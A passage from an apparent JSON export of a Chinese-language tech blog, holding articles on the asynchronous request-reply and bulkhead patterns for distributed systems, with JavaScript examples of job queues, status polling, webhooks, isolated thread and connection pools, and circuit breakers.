90); &#x2F;&#x2F; 儲存結果 const resultUrl &#x3D; await storage.upload(report); await this.updateStatus(jobId, &#39;completed&#39;, 100, &#123; resultUrl &#125;); &#125; catch (error) &#123; await this.updateStatus(jobId, &#39;failed&#39;, null, null, error.message); throw error; &#125; &#125; async updateStatus(jobId, status, progress, result &#x3D; null, error &#x3D; null) &#123; await db.jobs.update(jobId, &#123; status, progress, result, error, updatedAt: new Date() &#125;); &#125; &#125; 結論 非同步請求-回覆模式對於建構響應式、可擴展的分散式系統至關重要。透過將長時間執行的操作與即時回應解耦，它實現了： 更好的使用者體驗：即時回饋和非阻塞操作 改善的可擴展性：API 和處理層獨立擴展 增強的韌性：優雅地處理故障和重試 資源效率：最佳利用執行緒和連線 雖然它透過狀態追蹤和結果管理引入了複雜性，但對於需要超過幾秒的操作，其好處遠遠超過成本。當您需要執行耗時的工作而不阻塞客戶端時，請考慮使用此模式。 相關模式 Claim-Check 模式：補充非同步處理以處理大型負載 基於佇列的負載平衡：使用訊息佇列平滑流量高峰 競爭消費者：實現佇列工作的並行處理 優先佇列：在其他工作之前處理高優先順序工作 參考資料 Microsoft Azure 架構模式：非同步請求-回覆 企業整合模式：請求-回覆","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"zh-TW"},{"title":"异步请求-回复模式：构建响应式分布式系统","slug":"2020/04/Asynchronous-Request-Reply-Pattern-zh-CN","date":"un11fin11","updated":"un55fin55","comments":true,"path":"/zh-CN/2020/04/Asynchronous-Request-Reply-Pattern/","permalink":"https://neo01.com/zh-CN/2020/04/Asynchronous-Request-Reply-Pattern/","excerpt":"了解异步请求-回复模式如何通过将长时间运行的操作与即时响应解耦，实现响应式应用程序，防止超时并改善用户体验。","text":"现代应用程序经常需要执行需要大量时间完成的操作——处理大型文件、生成复杂报表，或调用缓慢的外部 API。当这些操作阻塞请求线程时，会造成糟糕的用户体验，并可能耗尽服务器资源。异步请求-回复模式通过将请求与响应解耦来解决这个问题，让应用程序在后台处理工作时保持响应。 问题：当操作耗时过长 传统的同步请求-响应模型适用于快速操作。客户端发送请求，等待处理，然后接收响应——全部在几秒内完成。然而，当操作耗时较长时，这个模型就会失效： 超时失败：HTTP 连接在处理完成前超时 资源耗尽：线程保持阻塞状态，限制并发请求数量 糟糕的用户体验：用户盯着加载动画或冻结的界面 连锁故障：缓慢的操作可能导致整个系统崩溃 ⚠️ 同步陷阱单一耗时 30 秒的缓慢操作可能在整个期间占用一个线程。在线程数量有限的情况下，仅仅几个缓慢的请求就能让整个应用程序对新请求无响应。 考虑这些常见场景： 视频处理：将上传的视频转换为多种格式 报表生成：从大型数据集创建复杂的分析报表 批处理操作：在单一请求中处理数千条记录 外部 API 调用：等待缓慢的第三方服务 机器学习：在大型模型上执行推理 解决方案：将请求与响应解耦 异步请求-回复模式将请求提交与结果获取分离： 客户端提交请求并立即收到确认消息及状态端点 服务器在后台异步处理 客户端轮询状态端点或在完成时接收回调 客户端在处理完成时获取结果 sequenceDiagram participant Client as 客户端 participant API as API 网关 participant Queue as 消息队列 participant Worker as 后台工作进程 participant Storage as 结果存储 Client->>API: 1. POST /process (请求) API->>Queue: 2. 将任务加入队列 API-->>Client: 3. 202 Accepted + 状态 URL Note over Client: 客户端可自由执行其他工作 Worker->>Queue: 4. 从队列取出任务 Worker->>Worker: 5. 处理（长时间操作） Worker->>Storage: 6. 存储结果 Client->>API: 7. GET /status/{id} API->>Storage: 8. 检查状态 Storage-->>API: 9. 状态：完成 API-->>Client: 10. 200 OK + 结果 URL Client->>API: 11. GET /result/{id} API->>Storage: 12. 获取结果 Storage-->>API: 13. 返回结果 API-->>Client: 14. 200 OK + 结果数据 运作方式：模式实战 让我们逐步了解如何为视频转码服务实现此模式： 步骤 1：提交请求 客户端启动处理并立即收到确认： &#x2F;&#x2F; 客户端提交视频进行处理 const response &#x3D; await fetch(&#39;&#x2F;api&#x2F;videos&#x2F;transcode&#39;, &#123; method: &#39;POST&#39;, body: JSON.stringify(&#123; videoUrl: &#39;https:&#x2F;&#x2F;example.com&#x2F;video.mp4&#39;, formats: [&#39;720p&#39;, &#39;1080p&#39;, &#39;4k&#39;] &#125;) &#125;); &#x2F;&#x2F; 服务器立即响应 202 Accepted &#x2F;&#x2F; &#123; &#x2F;&#x2F; &quot;jobId&quot;: &quot;job-12345&quot;, &#x2F;&#x2F; &quot;status&quot;: &quot;pending&quot;, &#x2F;&#x2F; &quot;statusUrl&quot;: &quot;&#x2F;api&#x2F;videos&#x2F;status&#x2F;job-12345&quot; &#x2F;&#x2F; &#125; const &#123; jobId, statusUrl &#125; &#x3D; await response.json(); 步骤 2：异步处理 服务器将工作加入队列并在后台处理： &#x2F;&#x2F; API 端点处理器 app.post(&#39;&#x2F;api&#x2F;videos&#x2F;transcode&#39;, async (req, res) &#x3D;&gt; &#123; const jobId &#x3D; generateJobId(); &#x2F;&#x2F; 存储作业元数据 await jobStore.create(&#123; id: jobId, status: &#39;pending&#39;, request: req.body, createdAt: Date.now() &#125;); &#x2F;&#x2F; 加入队列进行后台处理 await messageQueue.send(&#123; jobId, videoUrl: req.body.videoUrl, formats: req.body.formats &#125;); &#x2F;&#x2F; 立即响应 res.status(202).json(&#123; jobId, status: &#39;pending&#39;, statusUrl: &#96;&#x2F;api&#x2F;videos&#x2F;status&#x2F;$&#123;jobId&#125;&#96; &#125;); &#125;); &#x2F;&#x2F; 后台工作进程 messageQueue.subscribe(async (message) &#x3D;&gt; &#123; await jobStore.update(message.jobId, &#123; status: &#39;processing&#39; &#125;); try &#123; const results &#x3D; await transcodeVideo( message.videoUrl, message.formats ); await jobStore.update(message.jobId, &#123; status: &#39;completed&#39;, results, completedAt: Date.now() &#125;); &#125; catch (error) &#123; await jobStore.update(message.jobId, &#123; status: &#39;failed&#39;, error: error.message &#125;); &#125; &#125;); 步骤 3：检查状态 客户端轮询状态端点以跟踪进度： &#x2F;&#x2F; 客户端轮询完成状态 async function waitForCompletion(statusUrl) &#123; while (true) &#123; const response &#x3D; await fetch(statusUrl); const status &#x3D; await response.json(); if (status.status &#x3D;&#x3D;&#x3D; &#39;completed&#39;) &#123; return status.results; &#125; if (status.status &#x3D;&#x3D;&#x3D; &#39;failed&#39;) &#123; throw new Error(status.error); &#125; &#x2F;&#x2F; 再次轮询前等待 await sleep(2000); &#125; &#125; &#x2F;&#x2F; 状态端点 app.get(&#39;&#x2F;api&#x2F;videos&#x2F;status&#x2F;:jobId&#39;, async (req, res) &#x3D;&gt; &#123; const job &#x3D; await jobStore.get(req.params.jobId); if (!job) &#123; return res.status(404).json(&#123; error: &#39;Job not found&#39; &#125;); &#125; res.json(&#123; jobId: job.id, status: job.status, results: job.results, createdAt: job.createdAt, completedAt: job.completedAt &#125;); &#125;); 实现策略 策略 1：轮询 客户端定期检查状态端点： 优点： 实现简单 适用于任何 HTTP 客户端 不需要服务器端回调基础设施 缺点： 增加网络流量 延迟通知（轮询间隔） 当没有变化时浪费请求 &#x2F;&#x2F; 指数退避轮询 async function pollWithBackoff(statusUrl, maxAttempts &#x3D; 30) &#123; let delay &#x3D; 1000; &#x2F;&#x2F; 从 1 秒开始 for (let i &#x3D; 0; i &lt; maxAttempts; i++) &#123; const status &#x3D; await checkStatus(statusUrl); if (status.status !&#x3D;&#x3D; &#39;pending&#39; &amp;&amp; status.status !&#x3D;&#x3D; &#39;processing&#39;) &#123; return status; &#125; await sleep(delay); delay &#x3D; Math.min(delay * 1.5, 30000); &#x2F;&#x2F; 最多 30 秒 &#125; throw new Error(&#39;Polling timeout&#39;); &#125; 策略 2：Webhooks 服务器在处理完成时回调客户端： 优点： 立即通知 不浪费轮询请求 有效利用资源 缺点： 需要可公开访问的回调 URL 更复杂的错误处理 安全性考量（验证、确认） &#x2F;&#x2F; 客户端提供回调 URL await fetch(&#39;&#x2F;api&#x2F;videos&#x2F;transcode&#39;, &#123; method: &#39;POST&#39;, body: JSON.stringify(&#123; videoUrl: &#39;https:&#x2F;&#x2F;example.com&#x2F;video.mp4&#39;, formats: [&#39;720p&#39;, &#39;1080p&#39;], callbackUrl: &#39;https:&#x2F;&#x2F;client.com&#x2F;webhook&#x2F;video-complete&#39; &#125;) &#125;); &#x2F;&#x2F; 服务器在完成时调用 webhook async function notifyCompletion(job) &#123; if (job.callbackUrl) &#123; await fetch(job.callbackUrl, &#123; method: &#39;POST&#39;, headers: &#123; &#39;X-Signature&#39;: generateSignature(job), &#39;Content-Type&#39;: &#39;application&#x2F;json&#39; &#125;, body: JSON.stringify(&#123; jobId: job.id, status: job.status, results: job.results &#125;) &#125;); &#125; &#125; 策略 3：WebSockets 维护持久连接以进行实时更新： 优点： 实时双向通信 对多次更新有效率 适合进度跟踪 缺点： 更复杂的基础设施 连接管理开销 不适用于所有环境 &#x2F;&#x2F; 客户端建立 WebSocket 连接 const ws &#x3D; new WebSocket(&#96;wss:&#x2F;&#x2F;api.example.com&#x2F;jobs&#x2F;$&#123;jobId&#125;&#96;); ws.onmessage &#x3D; (event) &#x3D;&gt; &#123; const update &#x3D; JSON.parse(event.data); if (update.status &#x3D;&#x3D;&#x3D; &#39;processing&#39;) &#123; console.log(&#96;进度：$&#123;update.progress&#125;%&#96;); &#125; else if (update.status &#x3D;&#x3D;&#x3D; &#39;completed&#39;) &#123; console.log(&#39;作业完成：&#39;, update.results); ws.close(); &#125; &#125;; 关键实现考量 1. 状态端点设计 设计清晰、信息丰富的状态响应： &#x2F;&#x2F; 设计良好的状态响应 &#123; &quot;jobId&quot;: &quot;job-12345&quot;, &quot;status&quot;: &quot;processing&quot;, &quot;progress&quot;: 65, &quot;message&quot;: &quot;正在转码为 1080p 格式&quot;, &quot;createdAt&quot;: &quot;2020-04-15T10:30:00Z&quot;, &quot;estimatedCompletion&quot;: &quot;2020-04-15T10:35:00Z&quot;, &quot;_links&quot;: &#123; &quot;self&quot;: &quot;&#x2F;api&#x2F;videos&#x2F;status&#x2F;job-12345&quot;, &quot;cancel&quot;: &quot;&#x2F;api&#x2F;videos&#x2F;cancel&#x2F;job-12345&quot; &#125; &#125; 2. HTTP 状态码 使用适当的状态码来传达状态： 202 Accepted：请求已接受处理 200 OK：状态检查成功 303 See Other：处理完成，重定向至结果 404 Not Found：作业 ID 不存在 410 Gone：作业已过期或清理 3. 结果存储与过期 实现结果的生命周期管理： &#x2F;&#x2F; 存储具有 TTL 的结果 await resultStore.set(jobId, result, &#123; expiresIn: 24 * 60 * 60 &#x2F;&#x2F; 24 小时 &#125;); &#x2F;&#x2F; 清理过期的作业 setInterval(async () &#x3D;&gt; &#123; const expiredJobs &#x3D; await jobStore.findExpired(); for (const job of expiredJobs) &#123; await resultStore.delete(job.id); await jobStore.delete(job.id); &#125; &#125;, 60 * 60 * 1000); &#x2F;&#x2F; 每小时 4. 幂等性 确保请求可以安全地重试： &#x2F;&#x2F; 使用幂等性密钥 app.post(&#39;&#x2F;api&#x2F;videos&#x2F;transcode&#39;, async (req, res) &#x3D;&gt; &#123; const idempotencyKey &#x3D; req.headers[&#39;idempotency-key&#39;]; &#x2F;&#x2F; 检查是否已处理 const existing &#x3D; await jobStore.findByIdempotencyKey(idempotencyKey); if (existing) &#123; return res.status(202).json(&#123; jobId: existing.id, status: existing.status, statusUrl: &#96;&#x2F;api&#x2F;videos&#x2F;status&#x2F;$&#123;existing.id&#125;&#96; &#125;); &#125; &#x2F;&#x2F; 处理新请求 const jobId &#x3D; await createJob(req.body, idempotencyKey); &#x2F;&#x2F; ... &#125;); 何时使用此模式 理想场景 ✅ 完美使用案例长时间运行的操作：需要超过几秒才能完成的任务 资源密集型处理：消耗大量 CPU、内存或 I/O 的操作 外部依赖：调用缓慢或不可靠的第三方服务 批处理：对大型数据集或多个项目的操作 考虑替代方案的情况 🤔 请三思如果...快速操作：亚秒级操作不会从异步复杂性中受益 简单用例：直接的 CRUD 操作同步运作良好 实时需求：当绝对需要立即结果时 架构质量属性 可扩展性 此模式实现水平扩展： 工作进程扩展：添加更多后台工作进程以处理增加的负载 队列缓冲：消息队列吸收流量高峰 资源优化：API 和处理层独立扩展 韧性 通过以下方式增强容错能力： 重试逻辑：失败的作业可以自动重试 断路器：防止连锁故障 优雅降级：即使工作进程过载，API 仍保持响应 用户体验 改善响应性： 即时反馈：用户获得即时确认 进度更新：显示处理状态和预估完成时间 非阻塞：用户可以在等待时继续其他活动 常见陷阱与解决方案 ⚠️ 注意轮询风暴：太多客户端过于频繁地轮询 解决方案：实现指数退避和速率限制 ⚠️ 注意丢失结果：结果在客户端获取前过期 解决方案：设置适当的 TTL 并在过期前通知客户端 ⚠️ 注意孤立作业：作业永远卡在处理状态 解决方案：实现作业超时和死信队列 实际示例：文档处理服务 这是一个完整的文档处理服务示例： &#x2F;&#x2F; API 层 class DocumentProcessingAPI &#123; async submitDocument(file, options) &#123; const jobId &#x3D; uuidv4(); &#x2F;&#x2F; 上传文件至存储 const fileUrl &#x3D; await storage.upload(file); &#x2F;&#x2F; 创建作业记录 await db.jobs.create(&#123; id: jobId, status: &#39;pending&#39;, fileUrl, options, createdAt: new Date() &#125;); &#x2F;&#x2F; 加入队列进行处理 await queue.publish(&#39;document-processing&#39;, &#123; jobId, fileUrl, options &#125;); return &#123; jobId, statusUrl: &#96;&#x2F;api&#x2F;documents&#x2F;status&#x2F;$&#123;jobId&#125;&#96; &#125;; &#125; async getStatus(jobId) &#123; const job &#x3D; await db.jobs.findById(jobId); if (!job) &#123; throw new NotFoundError(&#39;Job not found&#39;); &#125; return &#123; jobId: job.id, status: job.status, progress: job.progress, result: job.result, error: job.error &#125;; &#125; &#125; &#x2F;&#x2F; 工作进程层 class DocumentProcessor &#123; async processJob(message) &#123; const &#123; jobId, fileUrl, options &#125; &#x3D; message; try &#123; await this.updateStatus(jobId, &#39;processing&#39;, 0); &#x2F;&#x2F; 下载文档 const document &#x3D; await storage.download(fileUrl); await this.updateStatus(jobId, &#39;processing&#39;, 25); &#x2F;&#x2F; 提取文本 const text &#x3D; await this.extractText(document); await this.updateStatus(jobId, &#39;processing&#39;, 50); &#x2F;&#x2F; 分析内容 const analysis &#x3D; await this.analyzeContent(text, options); await this.updateStatus(jobId, &#39;processing&#39;, 75); &#x2F;&#x2F; 生成报表 const report &#x3D; await this.generateReport(analysis); await this.updateStatus(jobId, &#39;processing&#39;, 90); &#x2F;&#x2F; 存储结果 const resultUrl &#x3D; await storage.upload(report); await this.updateStatus(jobId, &#39;completed&#39;, 100, &#123; resultUrl &#125;); &#125; catch (error) &#123; await this.updateStatus(jobId, &#39;failed&#39;, null, null, error.message); throw error; &#125; &#125; async updateStatus(jobId, status, progress, result &#x3D; null, error &#x3D; null) &#123; await db.jobs.update(jobId, &#123; status, progress, result, error, updatedAt: new Date() &#125;); &#125; &#125; 结论 异步请求-回复模式对于构建响应式、可扩展的分布式系统至关重要。通过将长时间运行的操作与即时响应解耦，它实现了： 更好的用户体验：即时反馈和非阻塞操作 改善的可扩展性：API 和处理层独立扩展 增强的韧性：优雅地处理故障和重试 资源效率：最佳利用线程和连接 虽然它通过状态跟踪和结果管理引入了复杂性，但对于需要超过几秒的操作，其好处远远超过成本。当您需要执行耗时的工作而不阻塞客户端时，请考虑使用此模式。 相关模式 Claim-Check 模式：补充异步处理以处理大型负载 基于队列的负载均衡：使用消息队列平滑流量高峰 竞争消费者：实现队列作业的并行处理 优先队列：在其他作业之前处理高优先级作业 参考资料 Microsoft Azure 架构模式：异步请求-回复 企业集成模式：请求-回复","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"zh-CN"},{"title":"隔舱模式：在分布式系统中隔离故障","slug":"2020/03/Bulkhead-Pattern-zh-CN","date":"un33fin33","updated":"un55fin55","comments":true,"path":"/zh-CN/2020/03/Bulkhead-Pattern/","permalink":"https://neo01.com/zh-CN/2020/03/Bulkhead-Pattern/","excerpt":"探索隔舱模式如何通过隔离资源和限制故障影响范围，防止分布式系统中的连锁故障。","text":"想象一艘被隔舱分隔成多个水密舱室的船。如果船体破裂，只有一个舱室会进水，其他舱室保持干燥，让船只保持漂浮。这个海事安全原则启发了构建弹性分布式系统的关键模式：隔舱模式。 问题：连锁故障 在分布式系统中，组件共享资源，如线程池、数据库连接、内存和网络带宽。当一个组件故障或变慢时，它可能会耗尽所有可用资源，造成骨牌效应，导致整个系统崩溃。 考虑以下情境： 线程池耗尽：缓慢的外部 API 消耗所有线程，阻塞其他操作 连接池耗尽：一个数据库查询锁定所有连接，阻止其他服务访问数据库 内存饱和：一个组件的内存泄漏导致整个应用程序崩溃 网络带宽：大型文件传输占用其他网络操作的带宽 ⚠️ 实际影响单一缓慢的微服务消耗所有可用线程，可能连锁导致完全的系统中断，影响数千名用户和多个业务功能。 解决方案：隔离资源 隔舱模式通过将资源分割成隔离的池来解决这个问题。每个组件或服务获得自己的专用资源，防止故障在系统中扩散。 关键原则： 分割资源成隔离的池（线程池、连接池等） 分配资源基于关键性和预期负载 包含故障在其指定的分区内 维持服务对未受影响的组件 graph TB subgraph \"没有隔舱\" A1[服务 A] --> SP[共享池100 线程] B1[服务 B] --> SP C1[服务 C] --> SP SP -.->|故障扩散| X1[完全中断] end subgraph \"使用隔舱\" A2[服务 A] --> PA[池 A40 线程] B2[服务 B] --> PB[池 B30 线程] C2[服务 C] --> PC[池 C30 线程] PB -.->|故障被包含| X2[服务 B 停止] PA --> OK1[服务 A 正常] PC --> OK2[服务 C 正常] end style X1 fill:#ff6b6b,stroke:#c92a2a style X2 fill:#ffd43b,stroke:#f59f00 style OK1 fill:#51cf66,stroke:#2f9e44 style OK2 fill:#51cf66,stroke:#2f9e44 运作方式：资源隔离 让我们探索如何为不同的资源类型实现隔舱： 线程池隔离 分离的线程池防止一个缓慢的操作阻塞其他操作： &#x2F;&#x2F; 没有隔舱 - 共享线程池 const sharedExecutor &#x3D; new ThreadPoolExecutor(100); app.get(&#39;&#x2F;api&#x2F;orders&#39;, async (req, res) &#x3D;&gt; &#123; await sharedExecutor.execute(() &#x3D;&gt; fetchOrders()); &#125;); app.get(&#39;&#x2F;api&#x2F;inventory&#39;, async (req, res) &#x3D;&gt; &#123; await sharedExecutor.execute(() &#x3D;&gt; fetchInventory()); &#125;); &#x2F;&#x2F; 问题：缓慢的 fetchOrders() 阻塞 fetchInventory() &#x2F;&#x2F; 使用隔舱 - 隔离的线程池 const orderExecutor &#x3D; new ThreadPoolExecutor(40); const inventoryExecutor &#x3D; new ThreadPoolExecutor(30); const paymentExecutor &#x3D; new ThreadPoolExecutor(30); app.get(&#39;&#x2F;api&#x2F;orders&#39;, async (req, res) &#x3D;&gt; &#123; await orderExecutor.execute(() &#x3D;&gt; fetchOrders()); &#125;); app.get(&#39;&#x2F;api&#x2F;inventory&#39;, async (req, res) &#x3D;&gt; &#123; await inventoryExecutor.execute(() &#x3D;&gt; fetchInventory()); &#125;); app.get(&#39;&#x2F;api&#x2F;payment&#39;, async (req, res) &#x3D;&gt; &#123; await paymentExecutor.execute(() &#x3D;&gt; processPayment()); &#125;); &#x2F;&#x2F; 好处：缓慢的订单不会影响库存或付款 连接池隔离 为不同服务分离数据库连接池： &#x2F;&#x2F; 配置隔离的连接池 const orderDbPool &#x3D; createPool(&#123; host: &#39;db.example.com&#39;, database: &#39;orders&#39;, max: 20, &#x2F;&#x2F; 最多 20 个连接 min: 5 &#125;); const analyticsDbPool &#x3D; createPool(&#123; host: &#39;db.example.com&#39;, database: &#39;analytics&#39;, max: 10, &#x2F;&#x2F; 分析的独立池 min: 2 &#125;); &#x2F;&#x2F; 繁重的分析查询不会影响订单处理 async function getOrderDetails(orderId) &#123; const conn &#x3D; await orderDbPool.getConnection(); try &#123; return await conn.query(&#39;SELECT * FROM orders WHERE id &#x3D; ?&#39;, [orderId]); &#125; finally &#123; conn.release(); &#125; &#125; async function runAnalytics() &#123; const conn &#x3D; await analyticsDbPool.getConnection(); try &#123; return await conn.query(&#39;SELECT &#x2F;* 复杂的分析查询 *&#x2F;&#39;); &#125; finally &#123; conn.release(); &#125; &#125; 断路器集成 结合隔舱与断路器以增强弹性： const CircuitBreaker &#x3D; require(&#39;opossum&#39;); &#x2F;&#x2F; 为每个服务创建隔离的断路器 const orderServiceBreaker &#x3D; new CircuitBreaker(callOrderService, &#123; timeout: 3000, errorThresholdPercentage: 50, resetTimeout: 30000 &#125;); const inventoryServiceBreaker &#x3D; new CircuitBreaker(callInventoryService, &#123; timeout: 3000, errorThresholdPercentage: 50, resetTimeout: 30000 &#125;); &#x2F;&#x2F; 每个服务有自己的故障处理 async function processOrder(order) &#123; try &#123; const orderResult &#x3D; await orderServiceBreaker.fire(order); const inventoryResult &#x3D; await inventoryServiceBreaker.fire(order.items); return &#123; orderResult, inventoryResult &#125;; &#125; catch (error) &#123; &#x2F;&#x2F; 优雅地处理故障 return &#123; error: error.message &#125;; &#125; &#125; 实现策略 1. 基于服务的分割 根据服务边界分配资源： class BulkheadManager &#123; constructor() &#123; this.pools &#x3D; &#123; critical: new ThreadPool(50), &#x2F;&#x2F; 关键操作 standard: new ThreadPool(30), &#x2F;&#x2F; 标准操作 background: new ThreadPool(20) &#x2F;&#x2F; 后台任务 &#125;; &#125; async execute(priority, task) &#123; const pool &#x3D; this.pools[priority] || this.pools.standard; return pool.execute(task); &#125; &#125; const bulkhead &#x3D; new BulkheadManager(); &#x2F;&#x2F; 关键的面向用户操作 app.post(&#39;&#x2F;api&#x2F;checkout&#39;, async (req, res) &#x3D;&gt; &#123; const result &#x3D; await bulkhead.execute(&#39;critical&#39;, () &#x3D;&gt; processCheckout(req.body) ); res.json(result); &#125;); &#x2F;&#x2F; 后台操作 app.post(&#39;&#x2F;api&#x2F;analytics&#39;, async (req, res) &#x3D;&gt; &#123; await bulkhead.execute(&#39;background&#39;, () &#x3D;&gt; logAnalytics(req.body) ); res.status(202).send(); &#125;); 2. 基于租户的分割 在多租户系统中为每个租户隔离资源： class TenantBulkhead &#123; constructor() &#123; this.tenantPools &#x3D; new Map(); &#125; getPool(tenantId) &#123; if (!this.tenantPools.has(tenantId)) &#123; this.tenantPools.set(tenantId, new ThreadPool(10)); &#125; return this.tenantPools.get(tenantId); &#125; async execute(tenantId, task) &#123; const pool &#x3D; this.getPool(tenantId); return pool.execute(task); &#125; &#125; &#x2F;&#x2F; 租户 A 的繁重负载不会影响租户 B const tenantBulkhead &#x3D; new TenantBulkhead(); app.get(&#39;&#x2F;api&#x2F;data&#39;, async (req, res) &#x3D;&gt; &#123; const tenantId &#x3D; req.headers[&#39;x-tenant-id&#39;]; const result &#x3D; await tenantBulkhead.execute(tenantId, () &#x3D;&gt; fetchTenantData(tenantId) ); res.json(result); &#125;); 3. 基于负载的分割 分离高负载和低负载操作： const bulkheadConfig &#x3D; &#123; highThroughput: &#123; maxConcurrent: 100, queue: 1000 &#125;, lowThroughput: &#123; maxConcurrent: 20, queue: 100 &#125; &#125;; &#x2F;&#x2F; 高吞吐量端点 app.get(&#39;&#x2F;api&#x2F;search&#39;, rateLimiter(bulkheadConfig.highThroughput), async (req, res) &#x3D;&gt; &#123; &#x2F;&#x2F; 处理搜索请求 &#125; ); &#x2F;&#x2F; 低吞吐量但资源密集 app.post(&#39;&#x2F;api&#x2F;reports&#39;, rateLimiter(bulkheadConfig.lowThroughput), async (req, res) &#x3D;&gt; &#123; &#x2F;&#x2F; 生成复杂报告 &#125; ); 何时使用隔舱模式 主要使用案例 ✅ 理想情境共享资源竞争：当多个服务竞争有限资源（如线程、连接或内存）时。 关键服务保护：当您需要保证高优先级服务的可用性，无论其他组件故障如何。 多租户系统：当隔离租户可防止一个租户的负载影响其他租户时。 次要使用案例 📋 额外好处性能隔离：将缓慢操作与快速操作分离，以维持整体系统响应性。 故障包含：将故障的影响范围限制在特定分区。 资源优化：根据实际使用模式和优先级分配资源。 graph TD A[资源分析] --> B{共享资源？} B -->|是| C{关键服务？} B -->|否| D[监控使用] C -->|是| E[使用隔舱] C -->|否| F{多租户？} F -->|是| E F -->|否| G{性能问题？} G -->|是| E G -->|否| D style E fill:#51cf66,stroke:#2f9e44 style D fill:#4dabf7,stroke:#1971c2 架构质量属性 隔舱模式显著影响系统质量： 弹性 隔舱通过以下方式增强弹性： 故障隔离：将故障包含在特定分区内 优雅降级：在故障期间维持部分功能 影响范围限制：防止系统中的连锁故障 可用性 可用性改进包括： 服务连续性：关键服务在其他故障时保持可用 减少停机时间：隔离的故障不会导致完全中断 更快恢复：较小的故障域恢复更快 性能 性能优势来自： 资源优化：专用资源防止竞争 可预测的延迟：隔离防止缓慢操作影响快速操作 更好的吞吐量：并行处理而不互相干扰 可扩展性 可扩展性优势包括： 独立扩展：根据需求为特定分区扩展资源 负载分配：在隔离的资源池之间分配负载 容量规划：更容易为隔离组件规划容量 权衡与考量 像任何模式一样，隔舱引入了权衡： ⚠️ 潜在缺点资源开销：维护多个池消耗更多总资源 复杂性：额外的配置和管理开销 资源浪费：未充分利用的池代表浪费的容量 调整挑战：确定最佳分区大小需要仔细分析 调整隔舱大小 确定每个分区的正确大小至关重要： &#x2F;&#x2F; 调整大小时考虑这些因素 const bulkheadSize &#x3D; &#123; &#x2F;&#x2F; 预期并发请求 expectedLoad: 100, &#x2F;&#x2F; 平均响应时间（毫秒） avgResponseTime: 200, &#x2F;&#x2F; 安全边际（20%） safetyMargin: 1.2, &#x2F;&#x2F; 计算池大小 calculate() &#123; &#x2F;&#x2F; Little&#39;s Law: L &#x3D; λ × W &#x2F;&#x2F; L &#x3D; 并发请求 &#x2F;&#x2F; λ &#x3D; 到达率（请求&#x2F;秒） &#x2F;&#x2F; W &#x3D; 系统中的平均时间（秒） const arrivalRate &#x3D; this.expectedLoad &#x2F; 1; const timeInSystem &#x3D; this.avgResponseTime &#x2F; 1000; return Math.ceil(arrivalRate * timeInSystem * this.safetyMargin); &#125; &#125;; console.log(&#96;建议的池大小：$&#123;bulkheadSize.calculate()&#125;&#96;); 监控与可观察性 有效的隔舱实现需要监控： class MonitoredBulkhead &#123; constructor(name, maxConcurrent) &#123; this.name &#x3D; name; this.maxConcurrent &#x3D; maxConcurrent; this.active &#x3D; 0; this.rejected &#x3D; 0; this.completed &#x3D; 0; &#125; async execute(task) &#123; if (this.active &gt;&#x3D; this.maxConcurrent) &#123; this.rejected++; throw new Error(&#96;隔舱 $&#123;this.name&#125; 已达容量&#96;); &#125; this.active++; const startTime &#x3D; Date.now(); try &#123; const result &#x3D; await task(); this.completed++; return result; &#125; finally &#123; this.active--; const duration &#x3D; Date.now() - startTime; &#x2F;&#x2F; 发送指标 metrics.gauge(&#96;bulkhead.$&#123;this.name&#125;.active&#96;, this.active); metrics.counter(&#96;bulkhead.$&#123;this.name&#125;.completed&#96;, 1); metrics.histogram(&#96;bulkhead.$&#123;this.name&#125;.duration&#96;, duration); &#125; &#125; getMetrics() &#123; return &#123; name: this.name, active: this.active, utilization: (this.active &#x2F; this.maxConcurrent) * 100, rejected: this.rejected, completed: this.completed &#125;; &#125; &#125; 要监控的关键指标： 使用率：使用中的池容量百分比 拒绝率：由于容量而拒绝请求的频率 队列深度：等待中的请求数量 响应时间：每个分区内的延迟 错误率：每个隔舱内的故障 实际实现模式 模式 1：微服务架构 每个微服务都有隔离的资源： &#x2F;&#x2F; 服务 A - 订单服务 const orderService &#x3D; &#123; threadPool: new ThreadPool(50), dbPool: createPool(&#123; max: 20 &#125;), cachePool: createPool(&#123; max: 10 &#125;) &#125;; &#x2F;&#x2F; 服务 B - 库存服务 const inventoryService &#x3D; &#123; threadPool: new ThreadPool(30), dbPool: createPool(&#123; max: 15 &#125;), cachePool: createPool(&#123; max: 5 &#125;) &#125;; &#x2F;&#x2F; 服务之间完全隔离 模式 2：具有隔舱的 API 网关 API 网关为后端服务实现隔舱： const gateway &#x3D; &#123; routes: &#123; &#39;&#x2F;api&#x2F;orders&#39;: &#123; bulkhead: new Bulkhead(40), backend: &#39;http:&#x2F;&#x2F;orders-service&#39; &#125;, &#39;&#x2F;api&#x2F;inventory&#39;: &#123; bulkhead: new Bulkhead(30), backend: &#39;http:&#x2F;&#x2F;inventory-service&#39; &#125;, &#39;&#x2F;api&#x2F;analytics&#39;: &#123; bulkhead: new Bulkhead(10), backend: &#39;http:&#x2F;&#x2F;analytics-service&#39; &#125; &#125; &#125;; app.use(async (req, res) &#x3D;&gt; &#123; const route &#x3D; gateway.routes[req.path]; if (!route) return res.status(404).send(); try &#123; await route.bulkhead.execute(async () &#x3D;&gt; &#123; const response &#x3D; await fetch(route.backend + req.path); res.json(await response.json()); &#125;); &#125; catch (error) &#123; res.status(503).json(&#123; error: &#39;服务不可用&#39; &#125;); &#125; &#125;); 结论 隔舱模式对于构建弹性分布式系统至关重要。通过隔离资源和包含故障，它使系统能够： 防止连锁故障 在中断期间维持部分功能 保护关键服务 优化资源利用 虽然它引入了额外的复杂性和资源开销，但改进的弹性和可用性使其对生产系统来说非常宝贵。当共享资源造成竞争或当您需要保证关键服务的可用性时，请实现隔舱。 相关模式 断路器：通过防止调用故障服务来补充隔舱 重试模式：与隔舱一起处理暂时性故障 节流：控制请求速率以防止资源耗尽 基于队列的负载平衡：平滑可能压垮隔舱的负载峰值 参考资料 Microsoft Azure Architecture Patterns: Bulkhead Release It! Design and Deploy Production-Ready Software Netflix Hystrix: Bulkhead Pattern","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/tags/Architecture/"},{"name":"Design Patterns","slug":"Design-Patterns","permalink":"https://neo01.com/tags/Design-Patterns/"},{"name":"Resilience","slug":"Resilience","permalink":"https://neo01.com/tags/Resilience/"},{"name":"Fault 